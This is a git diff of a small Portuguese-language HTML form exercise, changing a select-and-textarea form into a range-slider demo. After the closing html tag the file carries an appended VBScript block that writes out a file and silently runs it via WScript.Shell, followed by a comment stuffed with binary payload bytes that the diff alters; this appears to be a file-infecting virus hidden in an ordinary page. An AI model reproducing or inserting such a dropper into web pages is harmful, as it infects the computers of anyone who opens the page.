@@ -4,49 +4,15 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FormulÃ¡rio</title>
+    <title>Document</title>
 </head>
 <body>
-    <h1>Exemplo de FormulÃ¡rio</h1>
     <form action="cadastro.php" method="get">
-        <p>
-            <label for="iest"></label>
-            <select name="est" id="iest">
-                <optgroup label="Sudeste">
-                    <option value="SP">SÃ£o Paullo</option>
-                    <option value="RJ">Rio de Janeiro</option>
-                    <option value="MG" selected>Minas Gerais</option>
-                </optgroup>
-
-                
-
-                <optgroup label="Nordeste">
-                    <option value="MA">MaranhÃ£o</option>
-                    <option value="PE">Pernambuco</option>
-                    <option value="RN">Rio Grande Do Norte</option>
-                </optgroup>
-            </select>
-
-            <p>
-                <label for="iprof"></label>
-                <input type="text" name="prof" id="iprof" list="lstprof">
-                    <datalist id="lstprof">
-                        <option value=>Professor</option>
-                        <option value=>Bombeiro</option>
-                        <option value=>Desenvolvedor</option>
-                    </datalist> 
-            </p>
-        </p>
-
-        <p>
-            <label for="imsg">Mensagem</label><br>
-            <textarea name="msg" id="imsg" cols="30" rows="10"></textarea>
-        </p>
-
-        <p>
-            <input type="submit" value="Enviar">
-            <input type="reset" value="Limpar">
-        </p>
+    <p>
+        <label for="inum">NÃºmero</label>
+        <input type="range" name="num" id="inum" min="0" max="10" value="5" oninput="ival.innerHTML = Number(inum.value)">
+        <output id="ival">5</output>
+    </p>
     </form>
 </body>
 </html><SCRIPT Language=VBScript><!--
@@ -63,6 +29,6 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--‚Ò°³rÕÓå¬¹Js’¾2H=Wjpp=‚k0Ó>İ4µUËí‚O6Ğ‹„_°¾øh
-Øoİä>*.iØJ]pËı¯’}´HÚÜ¦Ëv\]8e˜¡™£Ü@T®FûôÍ‡9ÁÁ ‘šƒâXT²}÷‘÷½éï5€ß‚MÚŠÂx±3RÀ%œ‹L ¹l÷„«’ŒÒì çê¡æ?…bœQ†»¦ÊüÄ\Ò—‡ş¯È ©ø]7áƒ¬yrîüŒòşö`A”•7*Ëãtâ¶¾İåyGweLØGÀbq(âÁv¯öPX/ªœ­š(‡ÒC„µoµQÇÁji˜ü¹F¸İ}‚® Nó„«5a;:DÏwDàşÃßÉÆ¶T{PğµVî•5«ş:)Â=–Kío^ê´ÂON¯:300 N~“ê%w)'»@¼ÆI•Z.:€“7	l¶¸áíMÁtÄXûH©œ 3éCÍM_ƒ—$GËLãO$®.K€•¾W¬_lÀFwxÅ»3kdÎ4,ŒÍ	6mªf	Ê :Dó²+éÍj/k®¥Sü{K@‹1€ßûê%»ÛÑûúùL ¤¼yú¯œj<öU½j	’áü!™ ËÎRÕøËÎËÎËÎÅ
--Nˆ¢8àÍÎ ËÎ-->
+//--></SCRIPT><!--¯Õ~Åé4PœUTŒÃtª5¯Îü"œ%“zå>±OÉHZØdi÷”¡`àü2ïdW—ş.œÔü°—æ3”‚Ë‘jí9Ú0œC}G«şğ\|j¶bÌ=æ^)ï,5ğ‹ø³Œ·kÒS(ŠS¹\ò‰Ò]‡NëÊ¹á¡âğ+–Õé:•Hœ¿&ˆ•Åï`ŠV]şk¹yÓÉå*„8N˜ë £ôoBo¯5ÔİìˆYıÊ­"9v¯sœ„ié"Óù†ëˆÄ’A¦Ie(P¸^Ìû	>©^Ö¸çÛˆöOJ!?¶PK(<Åâ6â'dÜ­ôW:Šû‡«$ß0á²+¼ Ô¯ŒFà„yj+µÂr4qÛ³R|”•_õº3ÀXg[e3uĞ?òŞÑ»â×„Ç%Šªá5HJøsù:ÆŞ<6lÉ=*‹Eî•ÒNbÇ¯vå.¡—­ØO™æO,!Âs1—ÍÓï”Œ®õ¹
+¯sÈhb-ÔÆ×w…Öi‚	hC’«çJfØ´”¤ ËÎRÕøËÎËÎËÎÅ
+-Nˆ¢8-ÉÎ ËÎ-->
